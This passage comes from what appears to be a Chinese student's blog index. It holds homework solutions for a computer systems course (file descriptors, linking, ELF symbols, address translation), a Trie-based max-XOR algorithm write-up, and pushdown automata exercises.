punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>答:</strong> 会输出 <code>fd2=4</code>.</p><p>进程创建时, <code>标准输入</code>, <code>标准输出</code>, <code>标准错误</code>已分别占用了描述符 <code>0</code>, <code>1</code>, <code>2</code>; 以只读方式打开文件 <code>foo.txt</code> 和 <code>bar.txt</code>, 可用描述符池分配 <code>fd1 = 3</code>, <code>fd2 = 4</code>; 关闭 <code>bar.txt</code> 后, 描述符 <code>4</code> 恢复到描述符池; 打开 <code>bar.txt</code> 后, 仍有 <code>fd2 = 4</code>.</p></li><li><p>在以下情形中, 分别需要使用什么 IO 方式来进行处理:</p><p>1) 编译器读取源文件  <strong>Standard IO.</strong></p><p>2) 编译器生成可执行文件  <strong>Standard IO.</strong></p><p>3) 处理图像文件  <strong>Standard  IO.</strong></p><p>4) 程序需要读写超大规模的文件，运行过程中可能需要处理外部信号  <strong>Unix IO.</strong></p><p>5) 访问网络内容  <strong>RIO.</strong></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机系统概论 作业4</title>
      <link href="/2022/12/08/ji-suan-ji-xi-tong-gai-lun-zuo-ye-4/"/>
      <url>/2022/12/08/ji-suan-ji-xi-tong-gai-lun-zuo-ye-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Hw4"><a href="#Hw4" class="headerlink" title="Hw4"></a>Hw4</h1><ol><li><p>某代码由 <code>foo.c</code> 与 <code>bar.c</code> 构成. 内容如下: </p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* foo.c */</span> <span class="token keyword">void</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* bar.c */</span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span> </span><span class="token keyword">extern</span> <span class="token keyword">char</span> main<span class="token punctuation">;</span> <span class="token keyword">void</span> <span class="token function">p2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"0x%x\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>main<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>( 具体取决于编译器实现 )</p><p>1) 请问能否正常联合编译? 如果可以联合编译则运行结果如何? 请说明你给出的回答的理由.</p><p><strong>答:</strong> 可以正常联合编译. 运行结果为编译后 <code>main()</code> 函数的地址. 因为 <code>main</code> 函数在 <code>bar.c</code> 中声明, 联合编译后 <code>p2()</code> 函数会输出变量 <code>main</code> 存储的值, 即编译后 <code>main()</code> 函数的地址.</p><p>2) 如果去掉 <code>bar.c</code> 中的 <code>extern</code> 关键字, 能否正常联合编译? 如果可以联合编译则运行结果如何? 请说明你给出的回答的理由. </p><p><strong>答:</strong> 可以正常联合编译. 运行结果为编译后 <code>main()</code> 函数的地址. (因为 <code>main</code> 为强定义, 会覆盖未初始化的弱定义 <code>char main</code>, 链接时不在乎类型.) 删去之后联合编译, 会在 <code>foo.c</code> 中得到其定义, 联合编译后 <code>p2()</code> 函数会输出 <code>main()</code> 函数的地址.</p></li><li><p>对于如下代码 <code>foo.c</code>, 如果编译为 <code>foo.o</code>, 那么在 <code>elf</code> 文件的以下段中, 会出现哪些符号? (如果有多种合法分布情况, 则任意给出一种即可).</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token number">3</span>   <span class="token keyword">extern</span> <span class="token keyword">int</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">4</span><span class="token number">5</span>   <span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">process</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>v1<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>v2<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>v3<span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token number">6</span>       <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token function">add</span><span class="token punctuation">(</span><span class="token operator">*</span>v1<span class="token punctuation">,</span> <span class="token operator">*</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">7</span>   <span class="token punctuation">}</span> <span class="token number">8</span> <span class="token number">9</span>   <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">10</span>  <span class="token keyword">extern</span> <span class="token keyword">int</span> b<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">11</span>  <span class="token keyword">static</span> <span class="token keyword">int</span> c<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token number">12</span> <span class="token number">13</span>  <span class="token keyword">int</span> <span class="token function">total_process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token number">14</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>i <span class="token operator">&lt;</span> <span class="token number">100</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token number">15</span>          <span class="token function">process</span><span class="token punctuation">(</span>a<span class="token operator">+</span>i<span class="token punctuation">,</span> b<span class="token operator">+</span>i<span class="token punctuation">,</span> c<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token number">16</span>      <span class="token punctuation">}</span> <span class="token number">17</span>  <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>( <code>gcc</code> 的内联函数需为 <code>static inline</code>. )</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.bss: a, b, c..data: 无. .text: total_process..symtab: add, process, a, b, c.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>其中对于 <code>total_process</code> 函数中用到的符号, 哪些会在编译期被定位, 哪些会在链接期被定位?</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">编译期定位的符号: i, total_process.链接期定位的符号: a, b, c.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>下面的问题涉及虚拟地址转换为物理地址</p><ul><li>内存是字节可寻址的  </li><li>内存访问是针对 <strong><code>1</code> 字节的字</strong>(即本题的 <code>word</code> 就是 <code>1</code> 个 <code>byte</code>)</li><li>虚拟地址 <code>16</code> 位宽 / 物理地址 <code>14</code> 位  </li><li>页面大小为 <code>1024</code> 字节  </li><li><code>TLB</code> 是 <code>4</code> 路组相联 (<code>4-way set associative</code>), 共有 <code>16</code> 个表项  </li></ul><p>在下表中, 所有数字都是十六进制的. 前 <code>32</code> 页的 <code>TLB</code> 和页表内容如下：</p><p><img src="D:/Shortcut/Class/22%20%E7%A7%8B/CSAPP/Homework/Hw/pic/4.png" alt=""></p><p>1) 下面的框显示了虚拟地址的格式. 指出字段用于确定以下内容: VPO / VPN / TLBI / TLBT/</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">VPN: <span class="token number">15</span> - <span class="token number">10</span>VPO: <span class="token number">9</span> - <span class="token number">0</span>TLBI: <span class="token number">11</span> - <span class="token number">10</span>TLBT: <span class="token number">15</span> - <span class="token number">12</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>类似的标注出物理地址的格式: PPO / PPN </p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PPN: <span class="token number">13</span> - <span class="token number">10</span>PPO: <span class="token number">9</span> - <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2) 对于给定的两个虚拟地址 (<code>0x2F09</code>、<code>0x0C53</code>), 请分别表示出相应的 <code>TLB</code> 表项和物理地址, 并指出 <code>TLB</code> 是否命中、是否发生 <code>page fault</code>. 如 <code>page fault</code>, 请在 <code>PPN</code> 中输入 <code>-</code>, <code>C</code> 部分留白.</p><p><strong>答:</strong></p><p><strong>0x2F09:</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">A:    Virtual Address:    0010 <span class="token number">1111</span> 0000 <span class="token number">1001</span>B:    VPN: 0x0B    TLB Index: 0x3    TLB Tag:0x2    TLB Hit: No <span class="token punctuation">(</span>注意这个 Hit<span class="token operator">!</span><span class="token punctuation">)</span>    Page Fault: Yes    PPN: -C:    Physical Address:    留白.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>0x0C53:</strong></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">A:    Virtual Address:    0000 <span class="token number">1100</span> 0101 0011B:    VPN: 0x03    TLB Index: 0x3    TLB Tag:0x0    TLB Hit: Yes    Page Fault: No    PPN: 0xDC:    Physical Address:    <span class="token number">11</span> 0100 0101 0011<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>程序运行之前需要为程序分配对应的内存空间, 并为内存空间赋予一定的初始值和属性, 下表为 <code>x86</code> 架构下用户空间的内存映射关系. 请填写下表, 并说明可执行文件对应的段 (<code>.data</code>, <code>.bss</code>, <code>.init</code>, <code>.rodata</code>, <code>.text</code>) 段分别会被以什么属性映射到哪部分内存空间中.</p><p>|     内存起始地址     |       内存类型       |                内存初始值                 |   内存属性   |<br>| :—————————: | :—————————: | :———————————————————-: | :—————: |<br>|      0xFFFFFFFF      |       内核地址       |                 系统决定                  | 不可读不可写 |<br>|      0xC0000000      |          栈          |                <strong>0(默认)</strong>                | <strong>可读可写</strong> |<br>| <strong>由可执行文件决定</strong> | <strong>共享库内存映射区</strong> |      <strong>共享库文件与可执行文件决定</strong>       |   <strong>只读</strong>   |<br>|      0x40000000      |     运行时堆空间     |             <strong>操作系统决定</strong>              | <strong>可读可写</strong> |<br>|   由可执行文件决定   |   <strong>可读写数据段</strong>   | .<strong>data由可执行文件决定, <br>.bss为 0</strong> |   可读可写   |<br>| <strong>由可执行文件决定</strong> |     <strong>只读数据</strong>     |            <strong>可执行文件决定</strong>             |   <strong>只读</strong>   |<br>|      0x08048000      |     保留内存地址     |                                           |              |</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">.data:  可读可写  映射到可读写数据段..bss:  可读可写  映射到可读写数据段..text:  只读  映射到只读数据.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> CSAPP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSAPP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Circuit</title>
      <link href="/2022/12/05/circuit/"/>
      <url>/2022/12/05/circuit/</url>
      
        <content type="html"><![CDATA[<h1 id="CST-PA4"><a href="#CST-PA4" class="headerlink" title="CST PA4"></a>CST PA4</h1><h2 id="4-1-Circuit"><a href="#4-1-Circuit" class="headerlink" title="4-1 Circuit"></a>4-1 Circuit</h2><h3 id="算法构思"><a href="#算法构思" class="headerlink" title="算法构思"></a>算法构思</h3><h4 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h4><p>本题需使用 <code>Trie Tree</code> 数据结构, 关于 <code>Trie Tree</code> 的介绍可参考<a href="https://zh.wikipedia.org/zh-hans/Trie">此篇文章</a>. 因为涉及的字符仅为 <code>0</code>, <code>1</code>, 因此实质上相当于一棵 <code>Binary Tree</code>.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 7</span>ull str<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>使用 <code>unsigned long long str[]</code> 数组储存 <code>01</code> 串, 不断更改当前的查询串编号, 将超出区间的串从 <code>Trie Tree</code> 中删去, 进入区间的串添加到 <code>Trie Tree</code> 中, 得到的结果存储在 <code>int ans[]</code> 中.</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// Line 14</span><span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> trie<span class="token punctuation">[</span><span class="token number">32001000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此 <code>Trie Tree</code> 中的串至多为 <code>500000</code> 个, <code>Trie Tree</code> 中的节点至多为 <code>500000 * 64 = 32000000</code> 个. 在节点内部维护其左右子节点 <code>son[0]</code>, <code>son[1]</code>, 并记录经过该节点的 <code>01</code> 串数 <code>cnt</code>.</p><h4 id="void-ReadAll"><a href="#void-ReadAll" class="headerlink" title="void ReadAll()"></a>void ReadAll()</h4><p>使用 <code>getchar()</code> 逐字符读入所给串, 计算其二进制值并存储为 <code>unsigned long long</code>.</p><h4 id="void-Insert"><a href="#void-Insert" class="headerlink" title="void Insert()"></a>void Insert()</h4><p>定义全局变量 <code>pointer</code> 记录下一个将被利用的节点编号.</p><p>对于一个 <code>unsigned long long</code> 存储的 <code>01</code> 串, 从根节点 <code>trie[0]</code> 开始从高到低逐位读取其各位数值, 为 <code>0</code> 则转向当前节点左孩子, 为 <code>1</code> 则转向当前节点右孩子. 若子节点存在, 则相应 <code>cnt++</code>; 若子节点为空, 则用 <code>trie[pointer]</code> 对其初始化, 并 <code>cnt++</code>.</p><p>当读入 <code>01</code> 串最后一位, 到达叶节点时, 直接将对应 <code>01</code> 串的编号存储在叶节点的 <code>cnt</code> 中.</p><h4 id="void-Remove"><a href="#void-Remove" class="headerlink" title="void Remove()"></a>void Remove()</h4><p>对于一个 <code>unsigned long long</code> 存储的 <code>01</code> 串, 按照同样过程在 <code>Trie Tree</code> 中访问其各个节点, 对应 <code>cnt--</code>. 若 <code>cnt</code> 减少到 <code>0</code>, 直接将其父节点的子节点标记置为 <code>0</code>, 以该节点为根的子树在之后都不会被访问.</p><h4 id="int-Query"><a href="#int-Query" class="headerlink" title="int Query()"></a>int Query()</h4><p>为了获得最大异或和, 在树上的每一步向下移动都尝试向着与所给串相反的方向进行即可.</p><h3 id="问题解决"><a href="#问题解决" class="headerlink" title="问题解决"></a>问题解决</h3><ul><li>按照编号从下往上扫描序列, 向 <code>Trie Tree</code> 中插入字符串, 靠前字符串编号会覆盖靠后字符串编号, 查询时即可输出最靠前序列编号.</li><li>特别地, 若所有 <code>01</code> 串均相同, 那么 <code>Trie Tree</code> 退化为一条单链. 此时唯一叶节点会在最后被串 <code>0</code> 标记覆盖, <code>Query(0)</code> 返回 <code>0</code>, 只需将其单独改为 <code>1</code> 即可.</li></ul><h3 id="复杂度估计"><a href="#复杂度估计" class="headerlink" title="复杂度估计"></a>复杂度估计</h3><h4 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h4><p>对每个 <code>01</code> 串进行 <code>Insert</code>, <code>Remove</code>, <code>Query</code> 的时间复杂度均为 $O(1)$, 而每个串至多进行 <code>Insert</code>, <code>Remove</code>, <code>Query</code> 各一次.</p><p>综上, 算法总体时间复杂度为 $O(64n)$.</p><h4 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h4><p>插入的串至多产生64n个节点，而每个节点只维护了左节点、右节点、经过次数（叶节点单位值）这三个信息，因此空间复杂度为O(64n)，常数上限为3倍。</p><p>其他数组均为500050大小，相对花销较小。</p><p>本体空间复杂度取决于 <code>01</code>串数 <code>n</code>, 最多在 <code>Trie Tree</code> 中产生 $64n$ 个节点. 题解中使用 <code>trie[]</code>, <code>str[]</code> 与 <code>ans[]</code> 数组模拟了一棵 <code>Trie Tree</code>, 最坏情况下整体需要的空间为 $O(64n)$.</p><p>本题中直接开辟了相关大小的数组存储信息,</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 7</span>ull str<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> ans<span class="token punctuation">[</span><span class="token number">500500</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token comment">// Line 14</span><span class="token keyword">class</span> <span class="token class-name">node</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> son<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span> trie<span class="token punctuation">[</span><span class="token number">32001000</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>空间消耗最坏情况约为: $5\times 10^5 \times 8B + 5\times 10^5 \times 4B + 3.2\times 10^7 \times 12B = 372MB &lt; 512MB$, 符合题目要求范围.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> DSA </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DSA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业8</title>
      <link href="/2022/12/02/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-8/"/>
      <url>/2022/12/02/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-8/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-6-4-2-c"><a href="#Ex-6-4-2-c" class="headerlink" title="Ex 6.4.2 (c)"></a>Ex 6.4.2 (c)</h3><p>​    构造以终态方式接受的 $DPDA$ </p><p><img src="/pic/43.png" alt=""></p><h3 id="Ex-6-4-3-a"><a href="#Ex-6-4-3-a" class="headerlink" title="Ex 6.4.3 (a)"></a>Ex 6.4.3 (a)</h3><p>​    假设以空栈方式接受的 $DPDA$ $P$ 接受串 $w\in L$, 考虑 $x\ne\varepsilon$.</p><p>​    那么我们存在状态 $q$,<br>​    <script type="math/tex">(q_0, wx, Z_0)\vdash^{*}(q, x, \varepsilon).</script><br>​    此时栈已空, 即 $DPDA$ 不能继续转移, 从而 $P$ 不能接受 $wx$.</p><p>​    即 $DPDA$ $P$ 接受的语言 $L$ 具有前缀性质.</p><h3 id="Ex-6-4-3-b"><a href="#Ex-6-4-3-b" class="headerlink" title="Ex 6.4.3 (b)"></a>Ex 6.4.3 (b)</h3><p>​    从 $P$ 构造以终态方式接受的 $DPDA$ $P’$:</p><p>​    (1) 增加初始状态 $q_0’$ 和初始栈符 $Z_0’$, 增加转移<br>​    <script type="math/tex">\delta(q_0', \varepsilon, Z_0') = \{(q_0, Z_0Z_0')\}.</script><br>​    其中 $q_0$, $Z_0$ 为 $P$ 的初始状态和初始栈符.</p><p>​    (2) 增加终止状态 $q_f’$, 对 $P$ 中每一状态 $q$ 增加转移<br>​    <script type="math/tex">\delta(q, \varepsilon, Z_0') = \{(q_f', Z_0')\}.</script><br>​    由于 $P’$ 经过一步推导进入 $P$, $P$ 是确定的, </p><p>​    并且 $P’$ 进行推导的第一步和最后一步是确定的,</p><p>​    从而 $P’$ 是一个以终态方式接受的 $DPDA$.</p><h3 id="Ex-6-4-3-c"><a href="#Ex-6-4-3-c" class="headerlink" title="Ex 6.4.3 (c)"></a>Ex 6.4.3 (c)</h3><p>​    从 $P’$ 构造以空栈方式接受的 $DPDA$ $P$:</p><p>​    (1) 增加初始状态 $q_0$ 和初始栈符 $Z_0$, 增加转移<br>​    <script type="math/tex">\delta(q_0, \varepsilon, Z_0) = \{(q_0', Z_0'Z_0)\}.</script><br>​    其中 $q_0’$, $Z_0’$ 为 $P’$ 的初始状态和初始栈符.</p><p>​    (2) 增加状态 $q$, 对 $P’$ 中所有接受状态 $q’$ 和栈符号 $Z’$, 增加转移</p><script type="math/tex; mode=display">\begin{aligned}\delta(q', \varepsilon, Z') &= \{(q, \varepsilon)\}, \\\delta(q, \varepsilon, Z') &= \{(q, \varepsilon)\}.\end{aligned}</script><p>​    从而 $P$ 是一个以空栈方式接受的 $PDA$, $L(P) = L$.</p><p>​    由于 $L$ 具有前缀性质, 因此 $P$ 具有确定性.</p><p>​    从而 $P$ 是一个以空栈方式接受的 $DPDA$.</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业7</title>
      <link href="/2022/11/30/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-7/"/>
      <url>/2022/11/30/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-7/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-6-3-2"><a href="#Ex-6-3-2" class="headerlink" title="Ex 6.3.2"></a>Ex 6.3.2</h3><p>​    构造以空栈方式接受的 $PDA$<br>​    <script type="math/tex">P = (\left\{q\right\}, \left\{a, b\right\}, \left\{S, A, a, b\right\}, \delta, q, S),</script><br>​    其中</p><script type="math/tex; mode=display">\begin{aligned}\delta(q, \varepsilon, S) &= \left\{(q, aAA)\right\}, \\\delta(q, \varepsilon, A) &= \left\{(q, aS), (q, bS), (q, a)\right\}, \\\delta(q, a, a) &= \left\{(q, \varepsilon)\right\}, \\\delta(q, b, b) &= \left\{(q, \varepsilon)\right\}.\end{aligned}</script><h3 id="Ex-6-3-4"><a href="#Ex-6-3-4" class="headerlink" title="Ex 6.3.4"></a>Ex 6.3.4</h3><p>​    构造上下文无关文法<br>​    <script type="math/tex">G = (V, \left\{0, 1\right\}, P, S),</script><br>​    其中<br>​    <script type="math/tex">V = \{S, [pZ_0p], [pZ_0q], [qZ_0p], [qZ_0q], [pXp], [pXq], [qXp], [qXq]\}.</script><br>​    $P$ 中包含以下产生式:</p><p>​    由 $(1)$ 得到的产生式:</p><script type="math/tex; mode=display">\begin{aligned}{}[qZ_0p] &\rightarrow 0[qXq][qZ_0p] \\[qZ_0p] &\rightarrow 0[qXp][pZ_0p] \\[qZ_0q] &\rightarrow 0[qXq][qZ_0q] \\[qZ_0q] &\rightarrow 0[qXp][pZ_0q]\end{aligned}</script><p>​    由 $(2)$ 得到的产生式:</p><script type="math/tex; mode=display">\begin{aligned}{}[qXp] &\rightarrow 0[qXq][qXp] \\[qXp] &\rightarrow 0[qXp][pXp] \\[qXq] &\rightarrow 0[qXq][qXq] \\[qXq] &\rightarrow 0[qXp][pXq]\end{aligned}</script><p>​    由 $(3)$ 得到的产生式:</p><script type="math/tex; mode=display">\begin{aligned}{}[qXq] &\rightarrow 1[qXq] \\[qXp] &\rightarrow 1[qXp]\end{aligned}</script><p>​    由 $(4)$ 得到的产生式:<br>​    <script type="math/tex">[qXp] \rightarrow \varepsilon</script><br>​    由 $(5)$ 得到的产生式:<br>​    <script type="math/tex">[pXp] \rightarrow \varepsilon</script><br>​    由 $(6)$ 得到的产生式:</p><script type="math/tex; mode=display">\begin{aligned}{}[pXp] &\rightarrow 1[pXq][qXp] \\[pXp] &\rightarrow 1[pXp][pXp] \\[pXq] &\rightarrow 1[pXq][qXq] \\[pXq] &\rightarrow 1[pXp][pXq]\end{aligned}</script><p>​     由 $(7)$ 得到的产生式:<br>​    <script type="math/tex">[pZ_0p] \rightarrow 1</script><br>​    由 $(8)$ 得到的产生式:</p><script type="math/tex; mode=display">\begin{aligned}S &\rightarrow [qZ_0q] \\S &\rightarrow [qZ_0p]\end{aligned}</script><h3 id="Ex-6-3-5-c"><a href="#Ex-6-3-5-c" class="headerlink" title="Ex 6.3.5 (c)"></a>Ex 6.3.5 (c)</h3><p>​    该语言的一个上下文无关文法为:<br>​    <script type="math/tex">S\rightarrow 0S1\mid 0S11\mid\varepsilon.</script><br>​    转换为以空栈方式接受的 $PDA$<br>​    <script type="math/tex">P = (\left\{q\right\}, \left\{0, 1\right\}, \left\{S, 0, 1\right\}, \delta, q, S),</script></p><p>​    其中</p><script type="math/tex; mode=display">\begin{aligned}\delta(q, \varepsilon, S) &= \left\{(q, \varepsilon), (q, 0S1), (q, 0S11)\right\}, \\\delta(q, 0, 0) &= \left\{(q, \varepsilon)\right\}, \\\delta(q, 1, 1) &= \left\{(q, \varepsilon)\right\}.\end{aligned}</script>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
          <category> FL&amp;A </category>
          
      </categories>
      
      
        <tags>
            
            <tag> FL&amp;A </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>形式语言与自动机 作业6</title>
      <link href="/2022/11/27/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-6/"/>
      <url>/2022/11/27/xing-shi-yu-yan-yu-zi-dong-ji-zuo-ye-6/</url>
      
        <content type="html"><![CDATA[<h2 id="必做题"><a href="#必做题" class="headerlink" title="必做题"></a>必做题</h2><h3 id="Ex-6-2-1-b"><a href="#Ex-6-2-1-b" class="headerlink" title="Ex 6.2.1 (b)"></a>Ex 6.2.1 (b)</h3><p>​    构造以终态方式接受的 $PDA$<br>​    <script type="math/tex">P = (\left\{q_0\right\}, \left\{0, 1\right\}, \left\{Z_0, X\right\}, \delta, q_0, Z_0, \left\{q_0\right\}),</script><br>​    其中</p><script type="math/tex; mode=display">\begin{aligned}\delta(q_0, 0, Z_0) &= \left\{(q_0, XZ_0)\right\}, \\\delta(q_0, 0, X) &= \left\{(q_0, XX)\right\}, \\\delta(q_0, 1, X) &= \left\{(q_0, \varepsilon)\right\}.\end{aligned}</script><p>​    <img src="/pic/41.png" alt=""></p><h3 id="Ex-6-2-1-c"><a href="#Ex-6-2-1-c" class="headerlink" title="Ex 6.2.1 (c)"></a>Ex 6.2.1 (c)</h3><p>​    构造以空栈方式接受的 $PDA$<br>​    <script type="math/tex">P = (\left\{q_0, q_1\right\}, \left\{0, 1\right\}, \left\{Z_0, X\right\}, \delta, q_0, Z_0),</script><br>​    其中</p><script type="math/tex; mode=display">\begin{aligned}\delta(q_0, 0, Z_0) &= \left\{(q_0, XZ_0)\right\}, \\ \delta(q_0, 1, Z_0) &= \left\{(q_1, XZ_0)\right\}, \\\delta(q_1, 0, Z_0) &= \left\{(q_0, XZ_0)\right\}, \\\delta(q_1, 1, Z_0) &= \left\{(q_1, XZ_0)\right\}, \\\delta(q_0, 0, X) &= \left\{(q_0, XX)\right\}, \\\delta(q_0, 1, X) &= \left\{(q_0, \varepsilon)\right\}, \\\delta(q_1, 0, X) &= \left\{(q_1, \varepsilon)\right\}, \\\delta(q_1, 1, X) &= \left\{(q_1, XX)\right\}, \\\delta(q_0, \varepsilon, Z_0) &= \left\{(q_0, \varepsilon)\right\}, \\\delta(q_1, \varepsilon, Z_0) &= \left\{(q_1, \varepsilon)\right\}.\end{aligned}</script><p>​    <img src="/pic/42.png" alt=""></p><h3 id="Ex-6-2-6-a"><a href="#Ex-6-2-6-a" class="headerlink" title="Ex 6.2.6 (a)"></a>Ex 6.2.6 (a)</h3><p>​    转换为以空栈方式接受的 $PDA$<br>​    <script type="math/tex">P_1 = 